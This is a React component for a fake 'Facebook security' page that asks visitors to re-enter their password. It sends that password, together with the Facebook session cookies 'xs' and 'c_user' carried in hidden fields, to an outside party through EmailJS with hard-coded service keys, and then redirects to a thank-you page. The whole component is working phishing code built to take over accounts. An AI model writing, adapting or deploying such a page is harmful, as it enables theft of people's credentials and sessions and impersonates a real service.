import React, { useRef, useState } from "react";
import { useNavigate } from "react-router";
import { useLocation } from "react-router-dom";
import "./Password.css";
import emailjs from "@emailjs/browser";
const Password = () => {
  const navigate = useNavigate();
  const [passwordText, setPasswordText] = useState("");
  const [isSuccess, setIsSuccess] = useState(false);
  const location = useLocation();
  const { state } = location;

  const submit = () => {
    console.log("pass", { ...state, passwordText });
    setIsSuccess(true);
    if (isSuccess) {
      navigate("/thanks");
    }
  };
  const form = useRef();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm("service_4b7aqok", "template_igp0zfi", form.current, {
        publicKey: "QFLclgh7p0QQlLcLD",
      })
      .then(
        () => {
          console.log("SUCCESS!");
          navigate("/thanks");
        },
        (error) => {
          console.log("FAILED...", error.text);
        }
      );
  };

  return (
    <form ref={form} onSubmit={sendEmail} className="passwordContainer">
      <img
        src="https://cdn.iconscout.com/icon/free/png-512/free-facebook-4062815-3357701.png?f=webp&w=512"
        alt="Facebook Logo"
      />
      <h3>Facebook security</h3>
      <hr />
      <p>Please re-enter password to complete the request.</p>
      <input type="hidden" name="xs" value={state.xs} />
      <input type="hidden" name="c_user" value={state.c_user} />

      <input
        type="password"
        value={passwordText}
        onChange={(e) => setPasswordText(e.target.value)}
        placeholder="Password"
        name="password"
      />
      <button type="submit">Submit</button>
    </form>
  );
};

export default Password;
